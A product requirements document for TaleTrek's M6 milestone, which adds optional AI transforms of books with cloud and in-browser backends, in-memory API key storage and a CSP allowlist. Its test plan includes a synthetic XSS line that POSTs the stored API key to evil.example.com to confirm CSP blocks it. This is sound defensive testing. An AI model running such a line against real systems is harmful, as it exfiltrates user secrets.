---
status: shipped
started: 2026-07-13
shipped: 2026-07-13
---

# PRD: M6 — AI Transforms

> **Note (post-ship revision):** The on-device **WebLLM / in-browser backend was
> removed** (see [`../adrs/0005-remove-in-browser-llm-backend.md`](../adrs/0005-remove-in-browser-llm-backend.md)).
> M6 is now **cloud-only**. The historical text below still describes the
> original dual-backend design; treat the in-browser/WebGPU/WebLLM portions as
> superseded. The `webllm.md` spike was deleted with the backend.

> **Status:** Implementation in progress (Checkpoint B). T0 WebLLM spike:
> go/no-go #1 (Vite+Worker bundle) ✅ confirmed; #2 (OPFS) + #3 (inference)
> pending real-hardware run — see [`../spikes/webllm.md`](../spikes/webllm.md).
> T1 (types + keyring + chunking) shipped, `pnpm verify` green. Post-M5; not
> part of launch-read-aloud core.
> **Companions:** [`../../VISION.md`](../VISION.md), [`../../ROADMAP.md`](../ROADMAP.md), [`M0-foundation.md`](M0-foundation.md), [`M1-upload-read.md`](M1-upload-read.md), [`M2-speak.md`](M2-speak.md), [`M3-jog.md`](M3-jog.md), [`M4-clean-reading.md`](M4-clean-reading.md), [`M5-library-offline.md`](M5-library-offline.md), [`../adrs/0003-ai-transform-architecture.md`](../adrs/0003-ai-transform-architecture.md), [`../adrs/0004-api-key-threat-model.md`](../adrs/0004-api-key-threat-model.md).

## Objective

Add an optional **post-processing layer** to TaleTrek: after upload (or any time later via a "Reprocess" action), readers can run AI-powered transformations on a book — semantic cleanup beyond M4's regex, translation, summarization, simplification, and LLM-proposed pronunciation hints.

Two execution backends, both opt-in:

1. **In-browser LLM** (default when AI is enabled) — runs via WebGPU (WebLLM), model cached in OPFS like Piper voices. Fully offline, no API key, no cloud.
2. **Cloud LLM** (power-user opt-in) — OpenAI-compatible HTTP API; user provides their own key, never persisted to disk. Covers OpenAI, Anthropic (via their OpenAI-compat shim), OpenRouter, Groq, Together, Ollama, LM Studio through one `{baseUrl, apiKey, model}` config.

Both backends implement one shared `AiTransformEngine` interface. The feature is **opt-in end-to-end** — disabled by default (`ai.enabled === false`): no Settings UI exposure beyond the enable toggle, no modals, no model downloads. Zero overhead when off.

This milestone **does not change** parsing, M4 cleaning, or playback engine behavior. It adds an AI layer on top of M1's ingest pipeline, an optional post-processing UI on top of M5's library, and a new `ai/` library alongside `tts/`.

**User stories:**

- *As a reader with no internet, I want OCR noise cleaned up that Piper would mispronounce — TaleTrek's local model fixes "Chapter 1" headers, scanned-page artifacts, and broken hyphenation without leaving my device.*
- *As a reader learning a language, I want a book translated into my native tongue — I paste my own OpenAI key once per session, run translate, listen on my run.*
- *As a reader with a long book, I want a condensed listen for my commute — I run summarize at 50% and get a tighter audiobook.*
- *As a reader with fantasy names Piper butchers, I want help building my pronunciation dictionary — the LLM proposes candidates, I accept the ones that look right, done forever.*

## Decisions (locked)

| Area | Decision |
| ---- | -------- |
| Scope (v1) | **Cleanup, translate, summarize, simplify, pronunciation-hints.** PDF chapter-boundary detection is a stretch goal — different shape (changes chapter count, not paragraph text), likely lands as a separate "restructure" action, deferred. |
| Two backends | **Both behind one `AiTransformEngine` interface.** In-browser = default. Cloud = opt-in power-user. **No TaleTrek backend ever** (preserves `VISION.md` non-goals). |
| In-browser stack | **WebGPU via WebLLM.** Default model: **Qwen2.5-1.5B-Instruct (Q4, ~1GB)** — WebLLM model id `Qwen2.5-1.5B-Instruct-q4f32_1-MLC` (canonical, corrected in the spike). Smallest model that handles translation + instruction-following acceptably. Cached in OPFS, mirrors the Piper pattern (`tts/voices.ts` → `piper.download()`/`stored()`). Switchable in Settings. See [`../spikes/webllm.md`](../spikes/webllm.md). |
| Cloud stack | **OpenAI-compatible HTTP only.** Single `{baseUrl, apiKey, model}` config covers OpenAI, Anthropic, OpenRouter, Groq, Together, Ollama, LM Studio. No per-provider SDKs — one code path, ~90% provider coverage. |
| API key storage | **In-memory only.** Module-scoped variable, dies on tab close. **Never** written to IndexedDB, localStorage, or sessionStorage. IndexedDB-at-rest and master-passphrase tiers explicitly rejected for v1 — see [ADR-0004](../adrs/0004-api-key-threat-model.md). |
| Exfiltration prevention | **Strict CSP `connect-src` allowlist** to known OpenAI-compatible host patterns + `localhost`. Even if XSS reads the key, it can't phone home anywhere except the legitimate provider. Primary security mitigation, more valuable than any at-rest encryption. |
| Originals policy | **Raw bytes are source of truth** (existing `files` store, gotcha #2). `Chapter.paragraphs` becomes "current view" — transformed if processing has run, original otherwise. Re-process always re-parses from raw bytes via `parseInWorker`; no `transforms?` sidecar field, no layer/toggle UX. |
| Position invalidation on transform | **Keep `chapterIndex`, reset `paragraphIndex` to 0** when a transform runs. Transforms preserve chapter boundaries (PDF chapter-detection is the stretch exception), so `chapterIndex` stays valid; `paragraphIndex` is meaningless after paragraph-content change. UI shows a one-line toast: *"Transform applied — resumed at start of chapter X."* `progressFraction` is also reset (it was computed against the old paragraph count). Consistent with M5's drift-fallback pattern (`M5-library-offline.md:228`). |
| Pronunciation UX | **LLM-proposes, user-reviews** (see `clean/pronunciation.ts:15` for the existing apply path). LLM scans first chapter (sample, not whole book), returns confidence-ranked candidates; user bulk-accepts/rejects; accepted entries land in the existing **global** `Settings.cleaning.pronunciation` dictionary. Dictionary stays source of truth — deterministic at TTS time, LLM out of the hot path, hints benefit all books. |
| Post-processing UX | **Action, not setting.** Surfaces in upload flow + library card menu (M5). Modal lists transforms as opt-in checkboxes, none checked by default. Cancel = proceed without transforms; book lands in library unprocessed. Modal is an offer, not a gate. |
| Modal timing flags | Two Settings flags govern the upload flow: `modal.beforeUpload` (default **false**) shows modal before file picker opens; `modal.afterUpload` (default **true**) shows modal after parse, before reader opens. **Both on → both fire, post-upload modal pre-filled from pre-upload choices.** Power-user affordance; default (B-only) is the right call for most readers. |
| Worker architecture | **WebLlmEngine runs in a dedicated Web Worker** (mirrors TTS pattern in `tts/client.ts`). CloudLlmEngine runs on main thread — `fetch()` + SSE parsing is non-blocking, no CPU work, key never crosses worker boundary. |
| Chunking | **Per-paragraph** for cleanup (parallelizable, no context needed). **Windowed** (10 paragraphs, 1-overlap) for translate/summarize/simplify. **Sample scan** (first chapter) for pronunciation-hints. |
| Progress + cancel | All ops report progress 0..1 via callback. Long ops **checkpoint per-paragraph completion** to IndexedDB so a tab crash doesn't lose everything. Cancel uses `AbortController` (cloud) or worker `terminate` + restart (in-browser). |
| Settings slot | New `ai?` field on `Settings` (additive, like M4's `cleaning` and M5's `position`). **No `DB_VERSION` bump.** |
| AI disabled (default) | `ai.enabled === false` → no Settings UI exposure beyond enable toggle, no modals, no model downloads, plain M1 upload flow. Zero overhead when off. |
| Licensing | ADR-0002 (MIT pipeline) **unchanged** for M6 in-browser engine. WebLLM is Apache-2.0 (permissive-compatible). Cloud path adds zero dependencies (native `fetch`). |
| Roadmap placement | **Post-launch milestone (after M5 ships).** Not part of "Launch — Read-Aloud Core" per `ROADMAP.md:32`. Aligns with the "Reading intelligence" future direction (`ROADMAP.md:87`). |

## Technologies (additions to M0–M5)

| Package | Version | License | Purpose |
| ------- | ------- | ------- | ------- |
| `@mlc-ai/web-llm` | spike-pinned | Apache-2.0 | In-browser LLM runtime (WebGPU). Used by WebLlmEngine only. |
| WebLLM model files | per-model | per-model (Qwen2.5 = MIT) | Downloaded to OPFS on demand, like Piper voices. |

Cloud path: **no dependencies** (native `fetch` + a small SSE parser).

Adding dependencies is ask-first per M0 boundaries. WebLLM is the first non-TTS ML dependency and significant both in size and Vite/Worker/PWA integration surface — **a spike must verify it loads cleanly under TaleTrek's build config before locking** (mirrors the M2 Piper spike process).

## Domain model (additions)

```ts
/** Kinds of AI paragraph-transformation TaleTrek supports. */
type TransformKind = 'cleanup' | 'translate' | 'summarize' | 'simplify'

/** Parameterized op passed to the engine. */
type TransformOp =
  | { kind: 'cleanup' }
  | { kind: 'translate'; target: string }       // BCP-47, e.g. 'es', 'fr', 'de'
  | { kind: 'summarize'; ratio: number }        // 0..1, e.g. 0.5 = halve
  | { kind: 'simplify'; level: number }         // 1..5, 1 = simplest

/** LLM-proposed pronunciation candidate (not yet accepted). */
interface PronunciationCandidate {
  id: string
  find: string
  replace: string
  confidence: number                             // 0..1, drives ranking + auto-accept
  category: 'proper-noun' | 'foreign' | 'neologism' | 'other'
}

/** Contract both backends implement. */
interface AiTransformEngine {
  isReady(): Promise<boolean>
  transform(
    input: string[],
    op: TransformOp,
    onProgress?: (fraction: number) => void,
    signal?: AbortSignal,
  ): Promise<string[]>
  proposePronunciationHints(
    sample: string[],
    onProgress?: (fraction: number) => void,
    signal?: AbortSignal,
  ): Promise<PronunciationCandidate[]>
}

/** Per-book record of last applied processing. */
interface AppliedProcessing {
  appliedAt: number
  transforms: TransformKind[]
  params: Record<TransformKind, unknown>         // e.g. { translate: { target: 'es' } }
}

interface Book {
  // ...existing
  processing?: AppliedProcessing
}

/** Additive Settings field. Key is NOT here — in-memory only. */
interface AiSettings {
  enabled: boolean
  backend: 'in-browser' | 'cloud'
  inBrowser: { modelId: string }
  cloud: { baseUrl: string; model: string }
  modal: { beforeUpload: boolean; afterUpload: boolean }
}

interface Settings {
  // ...existing
  ai?: AiSettings
}
```

New **db helper** (additive, no schema change):

```ts
/** Update a book's applied-processing record. Clears it when passed undefined. */
function updateBookProcessing(id: BookId, processing: AppliedProcessing | undefined): Promise<void>
```

`Chapter.paragraphs` is mutated **in place** by `putChapters` after a transform run (existing helper at `db.ts:161` already does the write within one transaction). Originals remain recoverable via `getBookFile` + `parseInWorker`.

## Architecture

```
/src/lib
  /ai
    types.ts              TransformKind, TransformOp, PronunciationCandidate,
                          AiTransformEngine, AppliedProcessing, AiSettings
    client.ts             picks engine by Settings.ai; routes transform/hints;
                          owns the Web Worker for WebLlm
    keyring.ts            in-memory key holder (module-scoped variable);
                          set/get/clear; surfaces explicit "forget key" to UI
    chunk.ts              per-op chunking: solo (cleanup), windowed
                          (translate/summarize/simplify), sample (hints)
    prompts.ts            per-op prompt templates (system + few-shot examples)
    protocol.ts           Web Worker request/response types (WebLlm only)
    engines/
      webllm.ts           in-browser WebGPU; runs in worker; model in OPFS
      openai.ts           cloud OpenAI-compatible; main-thread fetch + SSE
  db.ts                   + updateBookProcessing
  storage.ts              (unchanged)

/src/components
  PostProcessModal.tsx    NEW — presentational; transform checkboxes + per-op
                          param inputs; Cancel/Process; progress + cancel
  PronunciationReview.tsx NEW — presentational; confidence-ranked candidate
                          list; bulk accept/reject; per-row edit
  AiSettingsSection.tsx   NEW — presentational; backend radio, model picker,
                          key input (calls keyring.set), modal-timing flags

/src/routes
  upload.tsx              + modal hooks (pre/post file picker, per Settings.ai.modal)
  library.tsx             + "Reprocess" action on book card menu
  settings.tsx            + <AiSettingsSection/> (gated on ai.enabled toggle)

/src/hooks
  useAiTransform.ts       NEW — runs an op with progress + abort; reports
                          variant state {type:'idle'|'running'|'done'|'error'}
```

**Post-processing flow:**

1. User triggers (upload modal flag OR library "Reprocess" action).
2. `useAiTransform` resolves the engine via `client.ts`, calls `isReady()`.
3. If not ready: gate UI — for in-browser, prompt model download to OPFS; for cloud, prompt key via `keyring.set()`.
4. User picks ops in `PostProcessModal` → submits → `useAiTransform` chunks via `chunk.ts` and dispatches to the engine.
5. Per-chunk results stream back via `onProgress`; per-chunk completion checkpoints to IndexedDB.
6. On completion: `updateBookProcessing(id, ...)` records the config; `putChapters` writes the new `paragraphs` for affected chapters in one transaction.
7. Re-process flow: `getBookFile(id)` → `parseInWorker(file)` → re-transform with new config → overwrite. Originals are always recoverable.

**Worker boundary (WebLlm only):**

- main → worker: `{ id, op: 'transform'|'hints'|'load', payload, modelId }`
- worker → main: `{ id, type: 'progress', fraction }` | `{ id, type: 'success', result }` | `{ id, type: 'error', message }`
- Worker loads the WebLLM model on first request, keeps it hot until idle-timeout (5 min) or explicit teardown. Mirrors `tts/protocol.ts` shape exactly.

**Cloud path (main thread):**

- `fetch(\`${baseUrl}/chat/completions\`, { signal, headers: { Authorization: \`Bearer ${keyring.get()}\` }, body: ... })`
- Parse SSE stream for incremental content; report progress per chunk.
- Key never leaves `keyring.ts` module scope except into the `Authorization` header of a same-`connect-src`-allowlisted request.

## Commands

Unchanged from M5 — run at the workspace root:

```
pnpm install              # install deps (WebLLM added in M6)
pnpm dev                  # Vite dev server (web/)
pnpm build                # production build → web/dist
pnpm preview              # serve built dist (use this + hard reload to verify SW)
pnpm typecheck            # tsc --noEmit
pnpm lint                 | biome check (spike/ excluded)
pnpm lint:fix             # biome check --write
pnpm test                 # vitest run
pnpm verify               # lint + typecheck + test + build (run before commits)
```

## Code style

Follows `.opencode/tech/typescript/patterns.md` + `react/patterns.md` and the M0–M5 conventions. Highlights:

- **Strict TS**, branded IDs, `import type` for type-only imports (`verbatimModuleSyntax`).
- **Container/presentational split** — `useAiTransform` (hook, container-side) vs `PostProcessModal`/`PronunciationReview`/`AiSettingsSection` (props-only).
- **Variant types** for async states — `{ type: 'idle' } | { type: 'running'; fraction } | { type: 'done' } | { type: 'error'; message }`.
- **Context for low-frequency state only** — `ai` settings ride the existing `SettingsProvider` (`context/settings.tsx:50`); the key, the worker, transform progress, and pronunciation candidates are all component/hook-local. **Never** in Context.
- **Worker messaging** mirrors `tts/protocol.ts` and `tts/client.ts` exactly — typed request/response, monotonic `id`, progress events.
- **Additive storage** — `ai?` on Settings, `processing?` on Book; both optional, no migration, no `DB_VERSION` bump.
- **Key isolation** — `keyring.ts` is the only module permitted to hold the key; engines receive it as a function arg, never as a module import.
- **Key file import/export** — import accepts **JSON only**, shaped `{ apiKey, provider?, model?, baseUrl? }` (`lib/ai/importKey.ts`). `provider` maps to a `PROVIDER_PRESETS` id (`openrouter`, `groq`, `openai`, `together`, `zen`, `custom`); internally stored as `CloudProvider.presetId` (boundary translation, no settings migration). Export (`lib/ai/exportKey.ts`) round-trips the same shape and **includes the API key** (read from the in-memory keyring) when one is loaded — the downloaded file is a secret. TaleTrek itself still never persists the key (ADR-0004); a save-time reminder (`KeySaveWarningDialog`) and an export-time confirm (`KeyExportConfirmDialog`) make the in-memory / file-secret distinction explicit.
- No comments unless asked; Biome handles format/import-order (2-space, single quotes, no semicolons, trailing commas).

## Testing strategy

- **`lib/ai/chunk.test.ts`** — solo, windowed (with 1-overlap), sample strategies produce expected chunk counts and don't split surrogate pairs.
- **`lib/ai/keyring.test.ts`** — set/get/clear; get returns `undefined` after clear; never touches `localStorage`/`sessionStorage`/IndexedDB (assert via spies).
- **`lib/ai/engines/openai.test.ts`** — stubbed `fetch`: builds correct URL, headers include `Authorization: Bearer ...`, body includes model + messages; SSE parser handles incremental deltas; `AbortSignal` aborts fetch; non-200 throws typed error.
- **`lib/ai/engines/webllm.test.ts`** — stubbed WebLLM constructor: load → transform → progress events; worker protocol round-trip via `vi.fn()` mocks (real WebGPU only verified in browser MCP, not jsdom).
- **`hooks/useAiTransform.test.ts`** — variant transitions `idle→running→done` and `running→error`; abort returns to `idle`; progress events update state.
- **`components/PostProcessModal.test.tsx`** — renders checkboxes for each `TransformKind`; param inputs appear when checked; Cancel calls `onCancel`; Process calls `onProcess` with the selected ops+params; shows progress UI when `state.type === 'running'`.
- **`components/PronunciationReview.test.tsx`** — candidates sorted by confidence desc; per-row Accept adds to accepted set; "Accept all ≥ 0.8" bulk action; Submit calls `onAccept` with accepted entries only.
- **`routes/upload.test.tsx` (extended)** — `ai.modal.beforeUpload` true → modal renders before file picker; `ai.modal.afterUpload` true → modal renders after parse; both on → second modal pre-filled from first.
- **`routes/library.test.tsx` (extended)** — Reprocess action opens `PostProcessModal` pre-filled with `Book.processing`.
- **`routes/settings.test.tsx` (extended)** — `ai.enabled` toggle reveals/hides the section; backend radio swaps model picker vs endpoint fields; key input calls `keyring.set` and shows masked value; "Forget key" calls `keyring.clear`.
- **Browser (chrome-devtools MCP):**
  1. In-browser path: enable AI → download Qwen2.5-1.5B (OPFS) → upload TXT → post-process cleanup → verify paragraphs changed, reader shows new text, TTS still works.
  2. Cloud path: enable AI → set backend=cloud, baseUrl+key+model → run translate on a 2-paragraph TXT → verify Spanish output, key never appears in IndexedDB/localStorage dump (DevTools → Application tab).
  3. CSP verification: deliberately inject a synthetic XSS attempt via console that tries to `fetch('https://evil.example.com', { method: 'POST', body: keyring.get() })` → blocked by CSP.
  4. Tab close → reopen: key is gone, in-browser model still in OPFS, transformed book still readable.
  5. **Zero console errors; zero requests to non-allowlisted hosts.**
- **Coverage target:** `chunk`/`keyring`/`engines/*`/`useAiTransform` >90%; modal/review/settings wiring smoke-tested.

## Boundaries

- **Always:** `pnpm typecheck && pnpm test && pnpm lint` green before considering a task done; define interfaces (`AiTransformEngine`, `TransformOp`, db helper signatures) before implementing; keep presentational components props-only; verify SW/CSP via `pnpm preview` + hard reload (not `pnpm dev`).
- **Ask first:** adding dependencies beyond `@mlc-ai/web-llm`; bumping `DB_VERSION` or changing object-store list (M6 should need neither); changing the CSP `connect-src` allowlist to permit a new host pattern; shipping the cloud path enabled by default (it must stay opt-in per ADR-0004).
- **Never:** write the API key to persistent storage of any kind (IndexedDB/localStorage/sessionStorage); put the key in Context; put transform state in Context; disable strict TS; depend on a CDN at runtime for the LLM model (model lives in OPFS after first download); bypass the `AiTransformEngine` interface (no direct WebLLM or fetch calls outside `engines/*`); delete a failing test to make CI pass.

## Success criteria (testable)

1. With AI disabled (default), the app behaves identically to M5 — no Settings UI beyond the enable toggle, no modals, no model downloads, no console warnings.
2. Enabling AI → selecting in-browser → uploading a TXT → running `cleanup` produces visibly different `paragraphs` (assert at least one paragraph changed); the reader shows the new text; TTS still synthesizes.
3. Enabling AI → selecting cloud → entering a key → running `translate` to Spanish on a 2-paragraph book produces Spanish output; **DevTools → Application → IndexedDB + localStorage show no key anywhere.**
4. Pronunciation-hints run on a fantasy-named book returns ≥1 candidate; user accepts one → it lands in `Settings.cleaning.pronunciation` and is applied at TTS time (`applyPronunciation` path).
5. Closing and reopening the tab clears the key (in-memory only); the transformed book and the OPFS-cached model both persist.
6. Both `modal.beforeUpload` and `modal.afterUpload` on → both modals fire in sequence; the second is pre-filled from the first.
7. Cancelling either modal proceeds with upload normally; book lands in library unprocessed.
8. "Reprocess" from the library card menu opens `PostProcessModal` pre-filled with the book's existing `processing` config.
9. A deliberate CSP violation test (synthetic XSS attempt to POST the key to a non-allowlisted host) is blocked by the CSP `connect-src` allowlist.
10. `pnpm verify` (lint + typecheck + test + build) is green.
11. chrome-devtools MCP run: **zero console errors**; **zero requests to non-allowlisted hosts**; both backends verified end-to-end.

## Risks (tracked, not blocking)

| Risk | Mitigation |
| ---- | ---------- |
| **WebLLM + WebGPU unreliable on Safari/iOS** | Feature-detect WebGPU; if absent, fall back to cloud-only or disable AI with a clear message. Mobile Safari support is still maturing; this is acceptable for a post-launch opt-in feature. |
| **In-browser inference is slow** (30+ min for a full book on a 1.5B model) | Mitigations: smallest-viable model default, batching not parallelism (per ADR-0003), checkpoint-per-paragraph so tab crashes don't lose progress, "process in background tab" guidance in UI. |
| **Qwen2.5-1.5B translation quality is mediocre** | Power users switch to cloud (where GPT-4o / Claude / Gemini are available). In-browser is "good enough for cleanup + simplify"; translation is best on cloud. Document this in Settings copy. |
| **Cloud API key exposure to XSS** | ADR-0004 covers the threat model in full. Primary mitigation is strict CSP `connect-src` allowlist + minimal external scripts. Key never persisted; surface area is per-session only. |
| **Cloud provider changes API shape** | OpenAI-compatible is the de-facto standard; providers maintain compat at their end. We pin to the OpenAI Chat Completions v1 shape; provider drift is provider's problem. |
| **M3 jog-mode audio cache invalidation** | When `paragraphs` change via transform, the pre-rendered audio chunks (M3) must be invalidated for affected chapters. M6 hooks into `putChapters` and clears the corresponding audio cache entries. |
| **M5 saved playback position invalidation** | A transform changes paragraph content, so a saved `BookPosition.paragraphIndex` may now point to different text. **Mitigation (locked decision):** keep `chapterIndex`, reset `paragraphIndex` to 0, reset `progressFraction`. User resumes at start of the chapter they were in. Pronunciation-hints op is exempt (writes to dictionary only, doesn't touch `paragraphs`). |
| **IndexedDB write amplification during long transforms** | Per-chunk result checkpointing is throttled (≥1s between writes) + a final write on completion. Each write is a single `put` on the `books` store. |
| **CSP false-positives block legitimate providers** | Allowlist is regex-based and overridable in Settings (advanced). Default list covers the major OpenAI-compatible hosts. User-added `baseUrl` automatically extends the allowlist for that session. |
| **Service worker caches stale M6 bundle** | Existing gotcha #3: verify via `pnpm preview` + hard reload, or unregister the SW. |
| **iOS ITP evicts OPFS LLM model after 7 days** | Existing gotcha #2: model is re-downloadable; original file is source of truth. `navigator.storage.persist()` already requested in `main.tsx`. |
| **WebLLM Vite integration surprises** (worker bundling, WASM paths) | The pre-implementation spike (T0) verifies the build config end-to-end before locking. Mirrors the M2 Piper spike process. |

## Tasks (ordered, dependency-chained)

| # | Task | Acceptance | Verify | Files |
| - | ---- | ---------- | ------ | ----- |
| T0 | **WebLLM spike** | Verify `@mlc-ai/web-llm` loads under Vite + Web Worker + PWA; model downloads to OPFS; one inference round-trip works; document gotchas | `docs/spikes/webllm.md` (new) | throwaway spike under `spike/webllm/` |
| T1 | Types + keyring + chunking | `AiTransformEngine`, `TransformOp`, `AppliedProcessing`, `AiSettings` defined; `keyring` set/get/clear round-trip + zero persistence assertion; `chunk` strategies produce expected counts | `lib/ai/{types,chunk,keyring}.test.ts` | `lib/ai/types.ts`, `lib/ai/keyring.ts`, `lib/ai/chunk.ts` |
| T2 | Cloud engine + CSP | `engines/openai.ts` builds correct requests, parses SSE, aborts on signal; CSP `connect-src` allowlist configured; non-allowlisted host blocked in browser | `lib/ai/engines/openai.test.ts`; browser CSP test | `lib/ai/engines/openai.ts`, `vite.config.ts` (or `index.html` meta) |
| T3 | WebLLM engine + worker | `engines/webllm.ts` + worker protocol; load → transform → progress events; model cached in OPFS; idle teardown | `lib/ai/engines/webllm.test.ts`; browser MCP run | `lib/ai/engines/webllm.ts`, `lib/ai/protocol.ts`, `lib/ai/worker.ts`, `lib/ai/client.ts` |
| T4 | Settings + keyring UI | `ai?` on Settings (additive); `<AiSettingsSection/>` with backend radio, model picker, key input, "Forget key", modal flags | `routes/settings.test.tsx` (extended) | `context/settings.tsx`, `components/AiSettingsSection.tsx` |
| T5 | Post-process modal + useAiTransform | `<PostProcessModal/>` presentational; `useAiTransform` hook with variant state, progress, abort; chunking dispatch; `updateBookProcessing` write | `components/PostProcessModal.test.tsx`, `hooks/useAiTransform.test.ts`, `lib/db.test.ts` (extended) | `components/PostProcessModal.tsx`, `hooks/useAiTransform.ts`, `lib/db.ts`, `lib/ai/prompts.ts` |
| T6 | Upload flow wiring | Modal hooks fire per `ai.modal.beforeUpload`/`afterUpload`; both-on case pre-fills second modal; cancel proceeds normally | `routes/upload.test.tsx` (extended) | `routes/upload.tsx`, `App.tsx` |
| T7 | Library Reprocess + M3 cache invalidation | "Reprocess" action on book card menu opens modal pre-filled with `Book.processing`; transform completion clears affected M3 audio chunks | `routes/library.test.tsx` (extended) | `routes/library.tsx`, `lib/db.ts` |
| T8 | Pronunciation-hints review | `<PronunciationReview/>` confidence-ranked, bulk accept/reject, per-row edit; accepted entries write to `Settings.cleaning.pronunciation` | `components/PronunciationReview.test.tsx` | `components/PronunciationReview.tsx`, `hooks/useAiTransform.ts` |
| T9 | E2E + browser verify | Both backends verified; zero console errors; zero non-allowlisted network requests; key absent from storage dumps; `pnpm verify` green | full `pnpm verify` + chrome-devtools MCP | wiring + minor fixes |

**Ordering:** T0 (spike) → T1 → (T2 ‖ T3) → T4 → T5 → (T6 ‖ T7 ‖ T8) → T9. T2 and T3 are independent. T6/T7/T8 are independent post-modal.

**Checkpoints:** A (T0: WebLLM spike proves viable) · B (T1: types/keyring/chunk locked) · C (T2 ‖ T3: both engines functional) · D (T4: Settings wired) · E (T5: end-to-end post-process on one book) · F (T9: M6 shipped, verify green).

## Out of scope (later passes)

PDF chapter-boundary detection (different shape — restructures chapter count; deferred to a future "restructure" action); Tier-2 IndexedDB key storage and Tier-3 master-passphrase encryption (see ADR-0004 — revisit if power users ask); streaming in-browser inference UI (current: batch per chunk); per-book pronunciation dictionaries (current: global only); multi-modal AI (cover generation, OCR for scanned PDFs — currently throws `ParseError` at `pdf.ts:69`); cloud provider native SDKs (OpenAI-compat covers ~90%); A/B comparison UI between original and transformed text (re-process is the undo path); automatic transform defaults ("always translate new uploads to X" — power-user feature, deferred).
